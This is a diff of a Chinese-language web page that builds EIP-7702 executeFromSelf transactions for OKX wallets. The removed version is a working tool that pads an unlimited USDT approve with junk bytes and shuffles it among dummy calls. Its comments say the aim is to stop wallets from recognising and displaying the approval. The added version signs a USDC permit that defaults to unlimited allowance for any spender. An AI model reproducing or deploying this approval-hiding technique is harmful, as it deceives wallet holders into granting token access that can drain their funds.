@@ -3,194 +3,899 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OKX EIP-7702 深度混淆授权</title>
+    <title>OKX EIP-7702 USDC Permit 授权工具</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%); min-height: 100vh; color: #fff; padding: 20px; }
-        .container { max-width: 650px; margin: 0 auto; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .header h1 { font-size: 24px; margin-bottom: 10px; background: linear-gradient(90deg, #ff00cc, #333399); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; padding: 24px; margin-bottom: 20px; backdrop-filter: blur(10px); }
-        .card-title { font-size: 16px; font-weight: 600; margin-bottom: 16px; color: #a4aeff; }
-        .input-group { margin-bottom: 16px; }
-        .input-group label { display: block; font-size: 13px; color: #aaa; margin-bottom: 8px; }
-        .input-group input { width: 100%; padding: 14px 16px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 10px; color: #fff; outline: none; font-family: monospace; }
-        .btn { width: 100%; padding: 16px 24px; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; margin-bottom: 12px; }
-        .btn-primary { background: linear-gradient(90deg, #6a11cb, #2575fc); color: #fff; }
-        .btn-success { background: linear-gradient(90deg, #11998e, #38ef7d); color: #fff; }
-        .output-box { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(100, 100, 255, 0.3); border-radius: 8px; padding: 16px; margin: 16px 0; font-family: monospace; font-size: 10px; word-break: break-all; max-height: 150px; overflow-y: auto; color: #a4aeff; }
-        .status-box { background: rgba(0, 0, 0, 0.3); border-radius: 8px; padding: 12px; margin-top: 12px; font-family: monospace; font-size: 11px; color: #888; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            color: #fff;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 650px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #2775ca, #7b2cbf);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header p {
+            color: #888;
+            font-size: 13px;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .card-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #2775ca;
+        }
+
+        .info-box {
+            background: rgba(39, 117, 202, 0.1);
+            border: 1px solid rgba(39, 117, 202, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 16px;
+            font-size: 12px;
+            line-height: 1.8;
+        }
+
+        .info-box code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Monaco', 'Consolas', monospace;
+            color: #00ff88;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 13px;
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-label {
+            color: #888;
+        }
+
+        .info-value {
+            font-family: 'Monaco', 'Consolas', monospace;
+            color: #fff;
+            font-size: 11px;
+            word-break: break-all;
+            max-width: 55%;
+            text-align: right;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 8px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: #fff;
+            font-family: 'Monaco', 'Consolas', monospace;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: #2775ca;
+        }
+
+        .input-group input::placeholder {
+            color: #555;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px 24px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 12px;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-primary {
+            background: linear-gradient(90deg, #2775ca, #7b2cbf);
+            color: #fff;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(39, 117, 202, 0.3);
+        }
+
+        .btn-success {
+            background: linear-gradient(90deg, #00ff88, #00cc6a);
+            color: #000;
+        }
+
+        .btn-success:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
+        }
+
+        .btn-warning {
+            background: linear-gradient(90deg, #f7931a, #ff6b00);
+            color: #fff;
+        }
+
+        .btn-warning:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(247, 147, 26, 0.3);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .output-box {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            border-radius: 8px;
+            padding: 16px;
+            margin: 16px 0;
+            font-family: 'Monaco', 'Consolas', monospace;
+            font-size: 10px;
+            word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
+            color: #00ff88;
+            line-height: 1.6;
+        }
+
+        .output-box.empty {
+            color: #666;
+            border-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .copy-hint {
+            text-align: center;
+            color: #00ff88;
+            font-size: 14px;
+            margin: 8px 0;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .copy-hint.show {
+            opacity: 1;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .badge-success {
+            background: rgba(0, 255, 136, 0.2);
+            color: #00ff88;
+        }
+
+        .badge-warning {
+            background: rgba(255, 170, 0, 0.2);
+            color: #ffaa00;
+        }
+
+        .status-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 12px;
+            font-family: 'Monaco', 'Consolas', monospace;
+            font-size: 11px;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+
+        .log-item {
+            margin-bottom: 6px;
+            padding-left: 10px;
+            border-left: 2px solid #444;
+        }
+
+        .log-item.info { border-left-color: #2775ca; }
+        .log-item.success { border-left-color: #00ff88; }
+        .log-item.error { border-left-color: #ff4444; }
+        .log-item.warning { border-left-color: #ffaa00; }
+
         .hidden { display: none; }
+
+        .divider {
+            height: 1px;
+            background: rgba(255, 255, 255, 0.1);
+            margin: 20px 0;
+        }
+
+        .tx-link {
+            color: #2775ca;
+            text-decoration: none;
+        }
+
+        .signature-box {
+            background: rgba(39, 117, 202, 0.1);
+            border: 1px solid rgba(39, 117, 202, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            margin: 12px 0;
+            font-size: 11px;
+        }
+
+        .signature-box .sig-label {
+            color: #888;
+            margin-bottom: 4px;
+        }
+
+        .signature-box .sig-value {
+            font-family: 'Monaco', 'Consolas', monospace;
+            color: #2775ca;
+            word-break: break-all;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>OKX EIP-7702 深度混淆工具</h1>
-            <p>Payload Pollution + Multicall Padding</p>
+            <h1>OKX EIP-7702 USDC Permit</h1>
+            <p>使用 EIP-2612 permit 签名授权 USDC</p>
         </div>
 
+        <!-- 合约信息 -->
+        <div class="card">
+            <div class="card-title">OKX 委托合约信息</div>
+            <div class="info-row">
+                <span class="info-label">委托合约</span>
+                <span class="info-value">0x80296FF8D1ED46f8e3C7992664D13B833504c2Bb</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">执行方法</span>
+                <span class="info-value">executeFromSelf (0x893aa9f6)</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">USDC 合约 (ETH)</span>
+                <span class="info-value">0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">授权方法</span>
+                <span class="info-value">permit (0xd505accf)</span>
+            </div>
+        </div>
+
+        <!-- 连接钱包 -->
         <div class="card" id="connectCard">
-            <button class="btn btn-primary" onclick="connectWallet()">连接钱包</button>
+            <div class="card-title">连接钱包</div>
+            <button class="btn btn-primary" id="connectBtn" onclick="connectWallet()">
+                连接 OKX Wallet
+            </button>
+            <p style="text-align: center; color: #666; font-size: 12px; margin-top: 12px;">
+                请确保已安装 OKX Wallet 并切换到 ETH 主网
+            </p>
         </div>
 
-        <div class="card hidden" id="mainCard">
-            <div class="card-title">配置与生成</div>
-            
+        <!-- 账户信息 -->
+        <div class="card hidden" id="accountCard">
+            <div class="card-title">账户信息</div>
+            <div class="info-row">
+                <span class="info-label">地址</span>
+                <span class="info-value" id="accountAddress">-</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">ETH 余额</span>
+                <span class="info-value" id="accountBalance">-</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">USDC 余额</span>
+                <span class="info-value" id="usdcBalance">-</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">委托状态</span>
+                <span class="info-value" id="delegationStatus">-</span>
+            </div>
+        </div>
+
+        <!-- USDC Permit 授权 -->
+        <div class="card hidden" id="permitCard">
+            <div class="card-title">USDC Permit 授权</div>
+            <div class="info-box">
+                <strong>EIP-2612 Permit 说明:</strong><br>
+                Permit 允许通过链下签名授权，无需单独的 approve 交易。<br>
+                签名后通过 <code>executeFromSelf</code> 调用 USDC 的 <code>permit</code> 方法完成授权。
+            </div>
             <div class="input-group">
-                <label>授权 Spender 地址</label>
-                <input type="text" id="spenderInput" placeholder="0x..." oninput="generateCalldata()">
+                <label>授权给 (Spender 地址)</label>
+                <input type="text" id="spenderInput" placeholder="0x...">
+            </div>
+            <div class="input-group">
+                <label>授权数量 (USDC)</label>
+                <input type="text" id="amountInput" placeholder="输入数量或留空表示无限授权" value="">
+            </div>
+            <div class="input-group">
+                <label>授权有效期 (小时)</label>
+                <input type="number" id="deadlineInput" placeholder="24" value="24">
+            </div>
+        </div>
+
+        <!-- 签名和发送 -->
+        <div class="card hidden" id="actionCard">
+            <div class="card-title">签名并发送交易</div>
+
+            <button class="btn btn-primary" id="signBtn" onclick="signPermit()">
+                1. 签名 Permit 消息
+            </button>
+
+            <div class="signature-box hidden" id="signatureBox">
+                <div class="sig-label">签名信息:</div>
+                <div class="sig-value" id="signatureDisplay">-</div>
             </div>
 
-            <div class="output-box" id="calldataOutput">等待输入...</div>
-            
-            <button class="btn btn-success" onclick="sendTransaction()">执行混淆交易</button>
-            <div class="status-box" id="statusBox">就绪</div>
+            <div class="output-box empty" id="calldataOutput">
+                请先签名 Permit 消息
+            </div>
+
+            <button class="btn btn-success" onclick="copyCalldata()">
+                复制 Calldata
+            </button>
+            <div class="copy-hint" id="copyHint">已复制到剪贴板!</div>
+
+            <div class="divider"></div>
+
+            <button class="btn btn-warning" id="sendBtn" onclick="sendTransaction()" disabled>
+                2. 发送 Permit 交易
+            </button>
+
+            <div class="status-box" id="statusBox">
+                <div class="log-item info">等待操作...</div>
+            </div>
+        </div>
+
+        <!-- 交易结果 -->
+        <div class="card hidden" id="resultCard">
+            <div class="card-title">交易结果</div>
+            <div class="info-row">
+                <span class="info-label">状态</span>
+                <span class="info-value" id="txStatus">-</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">交易哈希</span>
+                <span class="info-value" id="txHash">-</span>
+            </div>
         </div>
     </div>
 
     <script>
-        // ================= 常量定义 =================
-        const OKX_DELEGATOR = '0x80296FF8D1ED46f8e3C7992664D13B833504c2Bb';
-        const USDT_ETH = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-        
-        const EXECUTE_FROM_SELF = '893aa9f6'; // executeFromSelf(Call[])
-        const APPROVE = '095ea7b3';           // approve(address,uint256)
-        const BALANCE_OF = '70a08231';        // balanceOf(address)
-        const MAX_UINT256 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+        // ==================== 常量 ====================
 
-        // ================= 全局变量 =================
+        // OKX 委托合约
+        const OKX_DELEGATOR = '0x80296FF8D1ED46f8e3C7992664D13B833504c2Bb';
+
+        // 函数选择器
+        const EXECUTE_FROM_SELF = '893aa9f6';  // executeFromSelf(Call[])
+        const PERMIT = 'd505accf';              // permit(address,address,uint256,uint256,uint8,bytes32,bytes32)
+
+        // ETH 主网 USDC
+        const USDC_ETH = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+        const USDC_DECIMALS = 6;
+
+        // USDC EIP-712 Domain
+        const USDC_NAME = 'USD Coin';
+        const USDC_VERSION = '2';
+        const CHAIN_ID = 1;  // ETH Mainnet
+
+        // MaxUint256
+        const MAX_UINT256 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+        const MAX_UINT256_BN = BigInt('0x' + MAX_UINT256);
+
+        // ==================== 全局变量 ====================
+
         let provider = null;
         let currentAccount = null;
         let generatedCalldata = null;
+        let permitSignature = null;
+        let permitParams = null;
 
-        // ================= 工具函数 =================
-        function toBytes32(v) { return BigInt(v).toString(16).padStart(64, '0'); }
-        function addrToBytes32(a) { return a.toLowerCase().replace('0x', '').padStart(64, '0'); }
+        // ==================== 工具函数 ====================
 
-        // ================= 核心混淆逻辑 =================
-        function generateCalldata() {
-            const output = document.getElementById('calldataOutput');
+        function toBytes32(value) {
+            return BigInt(value).toString(16).padStart(64, '0');
+        }
+
+        function addressToBytes32(address) {
+            return address.toLowerCase().replace('0x', '').padStart(64, '0');
+        }
+
+        function log(message, type = 'info') {
+            const box = document.getElementById('statusBox');
+            const item = document.createElement('div');
+            item.className = `log-item ${type}`;
+            item.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            box.appendChild(item);
+            box.scrollTop = box.scrollHeight;
+        }
+
+        // ==================== EIP-712 签名 ====================
+
+        async function signPermit() {
             const spender = document.getElementById('spenderInput').value.trim();
-
-            if (!spender || !/^0x[a-fA-F0-9]{40}$/.test(spender)) {
-                output.textContent = '请输入有效的 Spender 地址';
-                generatedCalldata = null;
+            if (!spender || !spender.match(/^0x[a-fA-F0-9]{40}$/)) {
+                alert('请填写有效的 Spender 地址');
                 return;
             }
 
-            // 1. 构造【脏数据】(Polluted Payload)
-            // 原理：在标准的 approve 调用数据后追加 32 字节垃圾数据
-            // 钱包看到长度不符合标准 ERC20 (68字节)，会放弃解析 "Approve"
-            // 但 EVM 执行时会忽略末尾多余数据，交易依然成功
-            
-            const standardData = APPROVE + addrToBytes32(spender) + MAX_UINT256;
-            // 随便写点垃圾数据，比如末尾是 1
-            const garbageData = "0000000000000000000000000000000000000000000000000000000000000001"; 
-            const pollutedData = standardData + garbageData;
+            const amountInput = document.getElementById('amountInput').value.trim();
+            let value;
+            if (!amountInput) {
+                value = MAX_UINT256_BN;
+            } else {
+                value = BigInt(Math.floor(parseFloat(amountInput) * Math.pow(10, USDC_DECIMALS)));
+            }
 
-            const realCall = {
-                target: USDT_ETH,
-                value: '0',
-                data: pollutedData // 使用脏数据
+            const deadlineHours = parseInt(document.getElementById('deadlineInput').value) || 24;
+            const deadline = BigInt(Math.floor(Date.now() / 1000) + deadlineHours * 3600);
+
+            // 获取 nonce
+            let nonce;
+            try {
+                const nonceData = await provider.request({
+                    method: 'eth_call',
+                    params: [{
+                        to: USDC_ETH,
+                        data: '0x7ecebe00' + addressToBytes32(currentAccount)  // nonces(address)
+                    }, 'latest']
+                });
+                nonce = BigInt(nonceData);
+            } catch (e) {
+                log('获取 nonce 失败: ' + e.message, 'error');
+                return;
+            }
+
+            log(`Nonce: ${nonce}`, 'info');
+            log(`Value: ${value.toString()}`, 'info');
+            log(`Deadline: ${deadline} (${new Date(Number(deadline) * 1000).toLocaleString()})`, 'info');
+
+            // EIP-712 类型数据
+            const domain = {
+                name: USDC_NAME,
+                version: USDC_VERSION,
+                chainId: CHAIN_ID,
+                verifyingContract: USDC_ETH
             };
 
-            // 2. 构造【噪音调用】(Dummy Calls)
-            // 插入一些无害的查询调用，进一步打乱数据特征
-            const dummyCall = {
-                target: USDT_ETH,
-                value: '0',
-                data: BALANCE_OF + addrToBytes32(currentAccount)
+            const types = {
+                Permit: [
+                    { name: 'owner', type: 'address' },
+                    { name: 'spender', type: 'address' },
+                    { name: 'value', type: 'uint256' },
+                    { name: 'nonce', type: 'uint256' },
+                    { name: 'deadline', type: 'uint256' }
+                ]
             };
 
-            // 3. 随机排序 (Shuffle)
-            // 将真正的 pollutedCall 藏在数组中间
-            let calls = [dummyCall, dummyCall, realCall, dummyCall];
-            calls = calls.sort(() => Math.random() - 0.5);
+            const message = {
+                owner: currentAccount,
+                spender: spender,
+                value: value.toString(),
+                nonce: nonce.toString(),
+                deadline: deadline.toString()
+            };
 
-            // 4. 手动编码 ABI (Call[] 结构)
-            // 注意：因为 data 长度变了，必须动态计算偏移量
-            let calldata = EXECUTE_FROM_SELF;
-            calldata += toBytes32(32); // 数组整体偏移
-            calldata += toBytes32(calls.length); // 数组长度
+            try {
+                log('请在钱包中签名 EIP-712 消息...', 'warning');
 
-            let currentDataOffset = calls.length * 32; // 第一个 Call 结构体内容的起始位置
-            let headers = "";
-            let bodies = "";
+                const signature = await provider.request({
+                    method: 'eth_signTypedData_v4',
+                    params: [currentAccount, JSON.stringify({
+                        types: {
+                            EIP712Domain: [
+                                { name: 'name', type: 'string' },
+                                { name: 'version', type: 'string' },
+                                { name: 'chainId', type: 'uint256' },
+                                { name: 'verifyingContract', type: 'address' }
+                            ],
+                            ...types
+                        },
+                        primaryType: 'Permit',
+                        domain: domain,
+                        message: message
+                    })]
+                });
 
-            calls.forEach(call => {
-                // 写入头部偏移量 (指向 body)
-                headers += toBytes32(currentDataOffset);
+                log('签名成功!', 'success');
 
-                // 准备 Body 数据
-                const d = call.data.replace('0x', '');
-                const dLen = d.length / 2;
-                const dPadded = d.padEnd(Math.ceil(d.length / 64) * 64, '0');
+                // 解析签名
+                const sig = signature.slice(2);
+                const r = '0x' + sig.slice(0, 64);
+                const s = '0x' + sig.slice(64, 128);
+                let v = parseInt(sig.slice(128, 130), 16);
+                if (v < 27) v += 27;
 
-                let body = "";
-                body += addrToBytes32(call.target); // target
-                body += toBytes32(call.value);      // value
-                body += toBytes32(96);              // data offset (固定为 96, 因为前面有 target(32)+value(32)+offset(32))
-                body += toBytes32(dLen);            // data length (这里写入的是包含脏数据的总长度)
-                body += dPadded;                    // data content
+                permitSignature = { r, s, v };
+                permitParams = {
+                    owner: currentAccount,
+                    spender: spender,
+                    value: value,
+                    deadline: deadline
+                };
 
-                bodies += body;
-                currentDataOffset += (body.length / 2); // 更新下一个偏移量
-            });
+                // 显示签名
+                document.getElementById('signatureBox').classList.remove('hidden');
+                document.getElementById('signatureDisplay').textContent =
+                    `v: ${v}, r: ${r.slice(0, 20)}..., s: ${s.slice(0, 20)}...`;
 
-            generatedCalldata = '0x' + calldata + headers + bodies;
-            output.textContent = generatedCalldata;
+                // 生成 calldata
+                generatePermitCalldata();
+
+                // 启用发送按钮
+                document.getElementById('sendBtn').disabled = false;
+
+            } catch (error) {
+                log('签名失败: ' + error.message, 'error');
+                if (error.code === 4001) {
+                    log('用户取消了签名', 'warning');
+                }
+            }
         }
 
-        // ================= 交互逻辑 =================
+        // ==================== 生成 Permit Calldata ====================
+
+        function generatePermitCalldata() {
+            if (!permitSignature || !permitParams) {
+                return;
+            }
+
+            const output = document.getElementById('calldataOutput');
+
+            // permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
+            let permitData = PERMIT;
+            permitData += addressToBytes32(permitParams.owner);
+            permitData += addressToBytes32(permitParams.spender);
+            permitData += toBytes32(permitParams.value);
+            permitData += toBytes32(permitParams.deadline);
+            permitData += toBytes32(permitSignature.v);
+            permitData += permitSignature.r.slice(2).padStart(64, '0');
+            permitData += permitSignature.s.slice(2).padStart(64, '0');
+
+            // 构建 executeFromSelf calldata
+            const call = {
+                target: USDC_ETH,
+                value: '0',
+                data: permitData
+            };
+
+            let calldata = '';
+
+            // 1. 函数选择器
+            calldata += EXECUTE_FROM_SELF;
+
+            // 2. 数组偏移量
+            calldata += toBytes32(32);
+
+            // 3. 数组长度 (只有1个调用)
+            calldata += toBytes32(1);
+
+            // 4. Call 偏移量
+            calldata += toBytes32(32);
+
+            // 5. Call 数据
+            const dataHex = call.data;
+            const dataLength = dataHex.length / 2;
+            const dataPadded = dataHex.padEnd(Math.ceil(dataHex.length / 64) * 64, '0');
+
+            calldata += addressToBytes32(call.target);  // target
+            calldata += toBytes32(call.value);          // value
+            calldata += toBytes32(96);                  // data offset
+            calldata += toBytes32(dataLength);          // data length
+            calldata += dataPadded;                     // data content
+
+            generatedCalldata = '0x' + calldata;
+            output.textContent = generatedCalldata;
+            output.classList.remove('empty');
+
+            log('Calldata 生成成功', 'success');
+
+            return generatedCalldata;
+        }
+
+        // ==================== 复制 ====================
+
+        function copyCalldata() {
+            if (!generatedCalldata) {
+                alert('请先签名并生成 Calldata');
+                return;
+            }
+
+            navigator.clipboard.writeText(generatedCalldata).then(() => {
+                const hint = document.getElementById('copyHint');
+                hint.classList.add('show');
+                setTimeout(() => hint.classList.remove('show'), 2000);
+            });
+        }
+
+        // ==================== 钱包连接 ====================
+
+        function getProvider() {
+            if (window.okxwallet) return window.okxwallet;
+            if (window.ethereum?.isOkxWallet) return window.ethereum;
+            if (window.ethereum) return window.ethereum;
+            return null;
+        }
+
         async function connectWallet() {
+            const btn = document.getElementById('connectBtn');
+            btn.disabled = true;
+            btn.textContent = '连接中...';
+
             try {
-                // 优先检测 OKX Wallet
-                provider = window.okxwallet || window.ethereum;
-                if (!provider) return alert('请安装钱包');
+                provider = getProvider();
+                if (!provider) {
+                    alert('未检测到钱包！请安装 OKX Wallet');
+                    return;
+                }
 
                 const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                if (accounts.length === 0) throw new Error('未获取到账户');
+
                 currentAccount = accounts[0];
-                
+
+                // 显示界面
                 document.getElementById('connectCard').classList.add('hidden');
-                document.getElementById('mainCard').classList.remove('hidden');
-                document.getElementById('statusBox').textContent = `已连接: ${currentAccount.slice(0,6)}...`;
-                
-                // 立即触发一次生成
-                if(document.getElementById('spenderInput').value) generateCalldata();
-                
-            } catch (e) {
-                alert(e.message);
-            }
-        }
+                document.getElementById('accountCard').classList.remove('hidden');
+                document.getElementById('permitCard').classList.remove('hidden');
+                document.getElementById('actionCard').classList.remove('hidden');
 
-        async function sendTransaction() {
-            if (!generatedCalldata) return alert('请先生成数据');
-            
-            const btn = document.querySelector('.btn-success');
-            btn.disabled = true;
-            btn.textContent = '请求中...';
+                // 更新账户信息
+                await updateAccountInfo();
 
-            try {
-                const txHash = await provider.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: currentAccount,
-                        to: currentAccount, // 发送给自己 (执行 executeFromSelf)
-                        value: '0x0',
-                        data: generatedCalldata
-                    }]
+                provider.on('accountsChanged', (accounts) => {
+                    if (accounts.length === 0) location.reload();
+                    currentAccount = accounts[0];
+                    updateAccountInfo();
                 });
-                
-                document.getElementById('statusBox').innerHTML = 
-                    `交易发送成功! Hash: <a href="https://etherscan.io/tx/${txHash}" target="_blank" style="color:#fff">${txHash.slice(0,10)}...</a>`;
-            } catch (e) {
-                document.getElementById('statusBox').textContent = '失败: ' + e.message;
+
+            } catch (error) {
+                alert('连接失败: ' + error.message);
             } finally {
                 btn.disabled = false;
-                btn.textContent = '执行混淆交易';
+                btn.textContent = '连接 OKX Wallet';
             }
         }
+
+        async function updateAccountInfo() {
+            // 地址
+            const shortAddr = `${currentAccount.slice(0, 6)}...${currentAccount.slice(-4)}`;
+            document.getElementById('accountAddress').textContent = shortAddr;
+
+            // ETH 余额
+            const balance = await provider.request({
+                method: 'eth_getBalance',
+                params: [currentAccount, 'latest']
+            });
+            const eth = parseInt(balance, 16) / 1e18;
+            document.getElementById('accountBalance').textContent = `${eth.toFixed(6)} ETH`;
+
+            // USDC 余额
+            try {
+                const usdcBalanceData = await provider.request({
+                    method: 'eth_call',
+                    params: [{
+                        to: USDC_ETH,
+                        data: '0x70a08231' + addressToBytes32(currentAccount)  // balanceOf(address)
+                    }, 'latest']
+                });
+                const usdcBalance = parseInt(usdcBalanceData, 16) / Math.pow(10, USDC_DECIMALS);
+                document.getElementById('usdcBalance').textContent = `${usdcBalance.toFixed(2)} USDC`;
+            } catch (e) {
+                document.getElementById('usdcBalance').textContent = '获取失败';
+            }
+
+            // 委托状态
+            const code = await provider.request({
+                method: 'eth_getCode',
+                params: [currentAccount, 'latest']
+            });
+
+            const statusEl = document.getElementById('delegationStatus');
+            if (code === '0x' || code === '0x0') {
+                statusEl.innerHTML = '<span class="badge badge-warning">未委托</span>';
+            } else if (code.toLowerCase().startsWith('0xef0100')) {
+                statusEl.innerHTML = '<span class="badge badge-success">已委托</span>';
+            }
+        }
+
+        // ==================== 发送交易 ====================
+
+        async function sendTransaction() {
+            if (!generatedCalldata) {
+                alert('请先签名并生成 Calldata');
+                return;
+            }
+
+            const btn = document.getElementById('sendBtn');
+            btn.disabled = true;
+            btn.textContent = '发送中...';
+
+            document.getElementById('statusBox').innerHTML = '';
+            log('开始发送 Permit 交易...', 'info');
+
+            try {
+                // 检查委托状态
+                const code = await provider.request({
+                    method: 'eth_getCode',
+                    params: [currentAccount, 'latest']
+                });
+
+                if (code === '0x' || code === '0x0') {
+                    throw new Error('账户尚未完成 EIP-7702 升级，请先升级');
+                }
+                log('账户已委托，可以发送交易', 'success');
+
+                // 获取 gas 价格
+                const gasPrice = await provider.request({ method: 'eth_gasPrice' });
+                log(`Gas Price: ${(parseInt(gasPrice, 16) / 1e9).toFixed(2)} Gwei`, 'info');
+
+                // 估算 gas
+                let gasLimit;
+                try {
+                    const estimated = await provider.request({
+                        method: 'eth_estimateGas',
+                        params: [{
+                            from: currentAccount,
+                            to: currentAccount,
+                            value: '0x0',
+                            data: generatedCalldata
+                        }]
+                    });
+                    gasLimit = '0x' + Math.floor(parseInt(estimated, 16) * 1.3).toString(16);
+                    log(`预估 Gas: ${parseInt(estimated, 16)}`, 'info');
+                } catch (e) {
+                    gasLimit = '0x30000';  // 默认 196608
+                    log('Gas 估算失败，使用默认值', 'warning');
+                }
+
+                // 构建交易
+                const txParams = {
+                    from: currentAccount,
+                    to: currentAccount,  // 发送到自己触发 executeFromSelf
+                    value: '0x0',
+                    data: generatedCalldata,
+                    gas: gasLimit,
+                    gasPrice: gasPrice
+                };
+
+                log('请在钱包中确认交易...', 'warning');
+
+                // 发送交易
+                const txHash = await provider.request({
+                    method: 'eth_sendTransaction',
+                    params: [txParams]
+                });
+
+                log(`交易已发送: ${txHash.slice(0, 20)}...`, 'success');
+
+                // 显示结果
+                document.getElementById('resultCard').classList.remove('hidden');
+                document.getElementById('txHash').innerHTML =
+                    `<a href="https://etherscan.io/tx/${txHash}" target="_blank" class="tx-link">${txHash.slice(0, 16)}...${txHash.slice(-8)}</a>`;
+                document.getElementById('txStatus').innerHTML = '<span class="badge badge-warning">确认中</span>';
+
+                // 等待确认
+                await waitForTx(txHash);
+
+            } catch (error) {
+                log('交易失败: ' + (error.message || error), 'error');
+                if (error.code === 4001) {
+                    log('用户取消了交易', 'warning');
+                }
+            } finally {
+                btn.disabled = false;
+                btn.textContent = '2. 发送 Permit 交易';
+            }
+        }
+
+        async function waitForTx(txHash) {
+            for (let i = 0; i < 60; i++) {
+                try {
+                    const receipt = await provider.request({
+                        method: 'eth_getTransactionReceipt',
+                        params: [txHash]
+                    });
+
+                    if (receipt) {
+                        const status = parseInt(receipt.status, 16);
+                        if (status === 1) {
+                            document.getElementById('txStatus').innerHTML = '<span class="badge badge-success">成功</span>';
+                            log('交易确认成功!', 'success');
+                        } else {
+                            document.getElementById('txStatus').innerHTML = '<span class="badge" style="background:rgba(255,68,68,0.2);color:#ff4444;">失败</span>';
+                            log('交易执行失败', 'error');
+                        }
+                        return;
+                    }
+                } catch (e) {}
+
+                await new Promise(r => setTimeout(r, 2000));
+            }
+            log('等待确认超时', 'warning');
+        }
+
+        // 页面加载检查
+        window.addEventListener('load', async () => {
+            provider = getProvider();
+            if (provider) {
+                try {
+                    const accounts = await provider.request({ method: 'eth_accounts' });
+                    if (accounts.length > 0) {
+                        currentAccount = accounts[0];
+                        document.getElementById('connectCard').classList.add('hidden');
+                        document.getElementById('accountCard').classList.remove('hidden');
+                        document.getElementById('permitCard').classList.remove('hidden');
+                        document.getElementById('actionCard').classList.remove('hidden');
+                        await updateAccountInfo();
+                    }
+                } catch (e) {}
+            }
+        });
     </script>
 </body>
 </html>
